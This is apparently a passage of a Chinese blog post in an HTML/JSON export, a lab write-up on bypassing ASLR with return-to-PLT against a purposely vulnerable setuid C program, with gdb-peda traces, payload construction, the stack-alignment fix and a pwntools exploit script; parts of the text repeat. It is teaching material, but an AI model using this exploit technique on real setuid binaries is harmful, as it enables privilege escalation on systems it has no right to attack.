</span><br><span class=\"line\">RSI: 0x602260 --&gt; 0x4173414125410a7f </span><br><span class=\"line\">RDI: 0x1 </span><br><span class=\"line\">RBP: 0x3425416525414925 (&apos;%IA%eA%4&apos;)</span><br><span class=\"line\">RSP: 0x7fffffffdd98 (&quot;A%JA%fA%5A%KA%gA%6A%\\n\\177&quot;)</span><br><span class=\"line\">RIP: 0x400638 (&lt;main+82&gt;:\tret)</span><br><span class=\"line\">R8 : 0x0 </span><br><span class=\"line\">R9 : 0x0 </span><br><span class=\"line\">R10: 0x602010 --&gt; 0x0 </span><br><span class=\"line\">R11: 0x246 </span><br><span class=\"line\">R12: 0x4004e0 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">R13: 0x7fffffffde70 --&gt; 0x1 </span><br><span class=\"line\">R14: 0x0 </span><br><span class=\"line\">R15: 0x0</span><br><span class=\"line\">EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)</span><br><span class=\"line\">[-------------------------------------code-------------------------------------]</span><br><span class=\"line\">   0x40062d &lt;main+71&gt;:\tcall   0x4004a0 &lt;puts@plt&gt;</span><br><span class=\"line\">   0x400632 &lt;main+76&gt;:\tmov    eax,0x0</span><br><span class=\"line\">   0x400637 &lt;main+81&gt;:\tleave  </span><br><span class=\"line\">=&gt; 0x400638 &lt;main+82&gt;:\tret    </span><br><span class=\"line\">   0x400639:\tnop    DWORD PTR [rax+0x0]</span><br><span class=\"line\">   0x400640 &lt;__libc_csu_init&gt;:\tpush   r15</span><br><span class=\"line\">   0x400642 &lt;__libc_csu_init+2&gt;:\tpush   r14</span><br><span class=\"line\">   0x400644 &lt;__libc_csu_init+4&gt;:\tmov    r15,rdx</span><br><span class=\"line\">[------------------------------------stack-------------------------------------]</span><br><span class=\"line\">0000| 0x7fffffffdd98 (&quot;A%JA%fA%5A%KA%gA%6A%\\n\\177&quot;)</span><br><span class=\"line\">0008| 0x7fffffffdda0 (&quot;5A%KA%gA%6A%\\n\\177&quot;)</span><br><span class=\"line\">0016| 0x7fffffffdda8 --&gt; 0x7f0a25413625 </span><br><span class=\"line\">0024| 0x7fffffffddb0 --&gt; 0x100008000 </span><br><span class=\"line\">0032| 0x7fffffffddb8 --&gt; 0x4005e6 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">0040| 0x7fffffffddc0 --&gt; 0x0 </span><br><span class=\"line\">0048| 0x7fffffffddc8 --&gt; 0xd10c02d6c0ba1de5 </span><br><span class=\"line\">0056| 0x7fffffffddd0 --&gt; 0x4004e0 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">[------------------------------------------------------------------------------]</span><br><span class=\"line\">Legend: code, data, rodata, value</span><br><span class=\"line\">Stopped reason: SIGSEGV</span><br><span class=\"line\">0x0000000000400638 in main ()</span><br><span class=\"line\">gdb-peda$ pattern_offset A%JA%fA%5A%KA%gA%6A%\\n\\177</span><br><span class=\"line\">A%JA%fA%5A%KA%gA%6A% found at offset: 280</span><br></pre></td></tr></table></figure>\n<p>现在构造payload如下:</p>\n<blockquote>\n<p>‘A’ * 280 + shell_addr</p>\n</blockquote>\n<p>测试一下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ python -c &quot;print &apos;A&apos; * 280 + &apos;\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00&apos;&quot; &gt; temp</span><br></pre></td></tr></table></figure>\n<p>我们发现，并没有给我们shell。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ gdb -q vuln</span><br><span class=\"line\">Catchpoint 1 (exec)</span><br><span class=\"line\">Reading symbols from vuln...(no debugging symbols found)...done.</span><br><span class=\"line\">gdb-peda$ r &lt; temp</span><br><span class=\"line\">Starting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln &lt; temp</span><br><span class=\"line\">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@</span><br><span class=\"line\">[New process 87894]</span><br><span class=\"line\"></span><br><span class=\"line\">Thread 2.1 &quot;vuln&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class=\"line\">[Switching to process 87894]</span><br><span class=\"line\"></span><br><span class=\"line\">[----------------------------------registers-----------------------------------]</span><br><span class=\"line\">RAX: 0x7ffff7b97e97 --&gt; 0x2f6e69622f00632d (&apos;-c&apos;)</span><br><span class=\"line\">RBX: 0x0 </span><br><span class=\"line\">RCX: 0x7ffff7b97e9f --&gt; 0x2074697865006873 (&apos;sh&apos;)</span><br><span class=\"line\">RDX: 0x0 </span><br><span class=\"line\">RSI: 0x7ffff7dd16a0 --&gt; 0x0 </span><br><span class=\"line\">RDI: 0x2 </span><br><span class=\"line\">RBP: 0x7fffffffdc58 --&gt; 0x0 </span><br><span class=\"line\">RSP: 0x7fffffffdbf8 --&gt; 0x7fffffffdc80 --&gt; 0x0 </span><br><span class=\"line\">RIP: 0x7ffff7a332f6 (&lt;do_system+1094&gt;:\tmovaps XMMWORD PTR [rsp+0x40],xmm0)</span><br><span class=\"line\">R8 : 0x7ffff7dd1600 --&gt; 0x0 </span><br><span class=\"line\">R9 : 0x0 </span><br><span class=\"line\">R10: 0x8 </span><br><span class=\"line\">R11: 0x246 </span><br><span class=\"line\">R12: 0x4006c4 --&gt; 0x68732f6e69622f (&apos;/bin/sh&apos;)</span><br><span class=\"line\">R13: 0x7fffffffde70 --&gt; 0x1 </span><br><span class=\"line\">R14: 0x0 </span><br><span class=\"line\">R15: 0x0</span><br><span class=\"line\">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class=\"line\">[-------------------------------------code-------------------------------------]</span><br><span class=\"line\">   0x7ffff7a332e6 &lt;do_system+1078&gt;:\tmovq   xmm0,QWORD PTR [rsp+0x8]</span><br><span class=\"line\">   0x7ffff7a332ec &lt;do_system+1084&gt;:\tmov    QWORD PTR [rsp+0x8],rax</span><br><span class=\"line\">   0x7ffff7a332f1 &lt;do_system+1089&gt;:\tmovhps xmm0,QWORD PTR [rsp+0x8]</span><br><span class=\"line\">=&gt; 0x7ffff7a332f6 &lt;do_system+1094&gt;:\tmovaps XMMWORD PTR [rsp+0x40],xmm0</span><br><span class=\"line\">   0x7ffff7a332fb &lt;do_system+1099&gt;:\tcall   0x7ffff7a23110 &lt;__GI___sigaction&gt;</span><br><span class=\"line\">   0x7ffff7a33300 &lt;do_system+1104&gt;:\tlea    rsi,[rip+0x39e2f9]        # 0x7ffff7dd1600 &lt;quit&gt;</span><br><span class=\"line\">   0x7ffff7a33307 &lt;do_system+1111&gt;:\txor    edx,edx</span><br><span class=\"line\">   0x7ffff7a33309 &lt;do_system+1113&gt;:\tmov    edi,0x3</span><br><span class=\"line\">[------------------------------------stack-------------------------------------]</span><br><span class=\"line\">0000| 0x7fffffffdbf8 --&gt; 0x7fffffffdc80 --&gt; 0x0 </span><br><span class=\"line\">0008| 0x7fffffffdc00 --&gt; 0x7ffff7b97e97 --&gt; 0x2f6e69622f00632d (&apos;-c&apos;)</span><br><span class=\"line\">0016| 0x7fffffffdc08 --&gt; 0x0 </span><br><span class=\"line\">0024| 0x7fffffffdc10 --&gt; 0x0 </span><br><span class=\"line\">0032| 0x7fffffffdc18 --&gt; 0x7ffff7a33360 (&lt;cancel_handler&gt;:\tpush   rbx)</span><br><span class=\"line\">0040| 0x7fffffffdc20 --&gt; 0x7fffffffdc14 --&gt; 0xf7a3336000000000 </span><br><span class=\"line\">0048| 0x7fffffffdc28 --&gt; 0x0 </span><br><span class=\"line\">0056| 0x7fffffffdc30 --&gt; 0x0 </span><br><span class=\"line\">[------------------------------------------------------------------------------]</span><br><span class=\"line\">Legend: code, data, rodata, value</span><br><span class=\"line\">Stopped reason: SIGSEGV</span><br><span class=\"line\">0x00007ffff7a332f6 in do_system (line=0x4006c4 &quot;/bin/sh&quot;) at ../sysdeps/posix/system.c:125</span><br><span class=\"line\">125\t../sysdeps/posix/system.c: No such file or directory.</span><br></pre></td></tr></table></figure>\n<p>卡在这个地方:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x7ffff7a332f6 &lt;do_system+1094&gt;:\tmovaps XMMWORD PTR [rsp+0x40],xmm0</span><br></pre></td></tr></table></figure>\n<p>这是因为movaps需要我们的rsp地址对齐到16字节。</p>\n<p>当前rsp的值:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RSP: 0x7fffffffdbf8</span><br></pre></td></tr></table></figure>\n<p>知道原因后，我们可以重新构造如下payload:</p>\n<blockquote>\n<p>‘A’ * 280 + ret_addr + shell_addr</p>\n</blockquote>\n<p>脚本如下:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 'A' * 280 + ret_addr + shell_addr</span></span><br><span class=\"line\">payload = <span class=\"string\">'A'</span> * <span class=\"number\">280</span> + <span class=\"string\">'\\x38\\x06\\x40\\x00\\x00\\x00\\x00\\x00'</span> + <span class=\"string\">'\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00'</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./vuln\"</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h1 id=\"绕过ASLR–return2plt\"><a href=\"#绕过ASLR–return2plt\" class=\"headerlink\" title=\"绕过ASLR–return2plt\"></a>绕过ASLR–return2plt</h1><h2 id=\"编译代码\"><a href=\"#编译代码\" class=\"headerlink\" title=\"编译代码\"></a>编译代码</h2><ol>\n<li><p>源代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\">/* Eventhough shell() function isnt invoked directly, its needed</span></span><br><span class=\"line\"><span class=\"comment\">   here since 'system@PLT' and 'exit@PLT' stub code should be pres</span></span><br><span class=\"line\"><span class=\"comment\">   ent in executable to successfully exploit it. */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">shell</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\tsystem(<span class=\"string\">\"/bin/sh\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> buf[<span class=\"number\">256</span>];</span><br><span class=\"line\">\tread(<span class=\"number\">0</span>, buf, <span class=\"number\">500</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,buf);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>编译命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span>echo 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class=\"line\"><span class=\"meta\">$</span>gcc -g -fno-stack-protector -no-pie -o vuln vuln.c</span><br><span class=\"line\"><span class=\"meta\">$</span>sudo chown root vuln</span><br><span class=\"line\"><span class=\"meta\">$</span>sudo chgrp root vuln</span><br><span class=\"line\"><span class=\"meta\">$</span>sudo chmod +s vuln</span><br></pre></td></tr></table></figure>\n</li>\n</ol>","more":"<h2 id=\"调试代码\"><a href=\"#调试代码\" class=\"headerlink\" title=\"调试代码\"></a>调试代码</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ i func</span><br><span class=\"line\">All defined functions:</span><br><span class=\"line\"></span><br><span class=\"line\">Non-debugging symbols:</span><br><span class=\"line\">0x0000000000400470  _init</span><br><span class=\"line\">0x00000000004004a0  puts@plt</span><br><span class=\"line\">0x00000000004004b0  system@plt</span><br><span class=\"line\">0x00000000004004c0  read@plt</span><br><span class=\"line\">0x00000000004004d0  exit@plt</span><br><span class=\"line\">0x00000000004004e0  _start</span><br><span class=\"line\">0x0000000000400510  _dl_relocate_static_pie</span><br><span class=\"line\">0x0000000000400520  deregister_tm_clones</span><br><span class=\"line\">0x0000000000400550  register_tm_clones</span><br><span class=\"line\">0x0000000000400590  __do_global_dtors_aux</span><br><span class=\"line\">0x00000000004005c0  frame_dummy</span><br><span class=\"line\">0x00000000004005c7  shell</span><br><span class=\"line\">0x00000000004005e6  main</span><br><span class=\"line\">0x0000000000400640  __libc_csu_init</span><br><span class=\"line\">0x00000000004006b0  __libc_csu_fini</span><br><span class=\"line\">0x00000000004006b4  _fini</span><br></pre></td></tr></table></figure>\n<p>首先，我们找到shell函数的地址<code>0x00000000004005c7</code></p>\n<p>再找到ret地址的偏移:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb-peda$ pattern_create 300</span><br><span class=\"line\">&apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%&apos;</span><br><span class=\"line\">gdb-peda$ r</span><br><span class=\"line\">Starting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln </span><br><span class=\"line\">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%</span><br><span class=\"line\">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Program received signal SIGSEGV, Segmentation fault.</span><br><span class=\"line\"></span><br><span class=\"line\">[----------------------------------registers-----------------------------------]</span><br><span class=\"line\">RAX: 0x0 </span><br><span class=\"line\">RBX: 0x0 </span><br><span class=\"line\">RCX: 0x7ffff7af4154 (&lt;__GI___libc_write+20&gt;:\tcmp    rax,0xfffffffffffff000)</span><br><span class=\"line\">RDX: 0x7ffff7dd18c0 --&gt; 0x0 </span><br><span class=\"line\">RSI: 0x602260 --&gt; 0x4173414125410a7f </span><br><span class=\"line\">RDI: 0x1 </span><br><span class=\"line\">RBP: 0x3425416525414925 (&apos;%IA%eA%4&apos;)</span><br><span class=\"line\">RSP: 0x7fffffffdd98 (&quot;A%JA%fA%5A%KA%gA%6A%\\n\\177&quot;)</span><br><span class=\"line\">RIP: 0x400638 (&lt;main+82&gt;:\tret)</span><br><span class=\"line\">R8 : 0x0 </span><br><span class=\"line\">R9 : 0x0 </span><br><span class=\"line\">R10: 0x602010 --&gt; 0x0 </span><br><span class=\"line\">R11: 0x246 </span><br><span class=\"line\">R12: 0x4004e0 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">R13: 0x7fffffffde70 --&gt; 0x1 </span><br><span class=\"line\">R14: 0x0 </span><br><span class=\"line\">R15: 0x0</span><br><span class=\"line\">EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)</span><br><span class=\"line\">[-------------------------------------code-------------------------------------]</span><br><span class=\"line\">   0x40062d &lt;main+71&gt;:\tcall   0x4004a0 &lt;puts@plt&gt;</span><br><span class=\"line\">   0x400632 &lt;main+76&gt;:\tmov    eax,0x0</span><br><span class=\"line\">   0x400637 &lt;main+81&gt;:\tleave  </span><br><span class=\"line\">=&gt; 0x400638 &lt;main+82&gt;:\tret    </span><br><span class=\"line\">   0x400639:\tnop    DWORD PTR [rax+0x0]</span><br><span class=\"line\">   0x400640 &lt;__libc_csu_init&gt;:\tpush   r15</span><br><span class=\"line\">   0x400642 &lt;__libc_csu_init+2&gt;:\tpush   r14</span><br><span class=\"line\">   0x400644 &lt;__libc_csu_init+4&gt;:\tmov    r15,rdx</span><br><span class=\"line\">[------------------------------------stack-------------------------------------]</span><br><span class=\"line\">0000| 0x7fffffffdd98 (&quot;A%JA%fA%5A%KA%gA%6A%\\n\\177&quot;)</span><br><span class=\"line\">0008| 0x7fffffffdda0 (&quot;5A%KA%gA%6A%\\n\\177&quot;)</span><br><span class=\"line\">0016| 0x7fffffffdda8 --&gt; 0x7f0a25413625 </span><br><span class=\"line\">0024| 0x7fffffffddb0 --&gt; 0x100008000 </span><br><span class=\"line\">0032| 0x7fffffffddb8 --&gt; 0x4005e6 (&lt;main&gt;:\tpush   rbp)</span><br><span class=\"line\">0040| 0x7fffffffddc0 --&gt; 0x0 </span><br><span class=\"line\">0048| 0x7fffffffddc8 --&gt; 0xd10c02d6c0ba1de5 </span><br><span class=\"line\">0056| 0x7fffffffddd0 --&gt; 0x4004e0 (&lt;_start&gt;:\txor    ebp,ebp)</span><br><span class=\"line\">[------------------------------------------------------------------------------]</span><br><span class=\"line\">Legend: code, data, rodata, value</span><br><span class=\"line\">Stopped reason: SIGSEGV</span><br><span class=\"line\">0x0000000000400638 in main ()</span><br><span class=\"line\">gdb-peda$ pattern_offset A%JA%fA%5A%KA%gA%6A%\\n\\177</span><br><span class=\"line\">A%JA%fA%5A%KA%gA%6A% found at offset: 280</span><br></pre></td></tr></table></figure>\n<p>现在构造payload如下:</p>\n<blockquote>\n<p>‘A’ * 280 + shell_addr</p>\n</blockquote>\n<p>测试一下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ python -c &quot;print &apos;A&apos; * 280 + &apos;\\xc7\\x05\\x40\\x00\\x00\\x00\\x00\\x00&apos;&quot; &gt; temp</span><br></pre></td></tr></table></figure>\n<p>我们发现，并没有给我们shell。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tianji@tianji-machine:~/Desktop/sploit/stack/bypassaslr_1$ gdb -q vuln</span><br><span class=\"line\">Catchpoint 1 (exec)</span><br><span class=\"line\">Reading symbols from vuln...(no debugging symbols found)...done.</span><br><span class=\"line\">gdb-peda$ r &lt; temp</span><br><span class=\"line\">Starting program: /home/tianji/Desktop/sploit/stack/bypassaslr_1/vuln &lt; temp</span><br><span class=\"line\">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@</span><br><span class=\"line\">[New process 87894]</span><br><span class=\"line\"></span><br><span class=\"line\">Thread 2.1 &quot;vuln&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class=\"line\">[Switching to process 87894]</span><br><span class=\"line\"></span><br><span class=\"line\">[----------------------------------registers-----------------------------------]</span><br><span class=\"line\">RAX: 0x7ffff7b97e97 --&gt; 0x2f6e69622f00632d (&apos;-c&apos;)</span><br><span class=\"line\">RBX: 0x0 </span><br><span class=\"line\">RCX: 0x7ffff7b97e9f --&gt; 0x2074697865006873 (&apos;sh&apos;)</span><br><span class=\"line\">RDX: 0x0 </span><br><span class=\"line\">RSI: 0x7ffff7dd16a0 --&gt; 0x0 </span><br><span class=\"line\">RDI: 0x2 </span><br><span class=\"line\">RBP: 0x7fffffffdc58 --&gt; 0x0 </span><br><span class=\"line\">RSP: 0x7fffffffdbf8 --&gt; 0x7fffffffdc80 --&gt; 0x0 </span><br><span class=\"line\">RIP: 0x7ffff7a332f6 (&lt;do_system+1094&gt;:\tmovaps XMMWORD PTR [rsp+0x40],xmm0)</span><br><span class=\"line\">R8 : 0x7ffff7dd1600 --&gt; 0x0 </span><br><span class=\"line\">R9 : 0x0 </span><br><span class=\"line\">R10: 0x8 </span><br><span class=\"line\">R11: 0x246 </span><br><span class=\"line\">R12: 0x4006c4 --&gt; 0x68732f6e69622f (&apos;/bin/sh&apos;)</span><br><span class=\"line\">R13: 0x7fffffffde70 --&gt; 0x1 </span><br><span class=\"line\">R14: 0x0 </span><br><span class=\"line\">R15: 0x0</span><br><span class=\"line\">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class=\"line\">[-------------------------------------code-------------------------------------]</span><br><span class=\"line\">   0x7ffff7a332e6 &lt;do_system+1078&gt;:\tmovq   xmm0,QWORD PTR [rsp+0x8]</span><br><span class=\"line\">   0x7ffff7a332ec &lt;do_system+1084&gt;:\tmov    QWORD PTR [rsp+0x8],rax</span><br><span class=\"line\">   0x7ffff7a332f1 &lt;do_system+1089&gt;:\tmovhps xmm0,QWORD 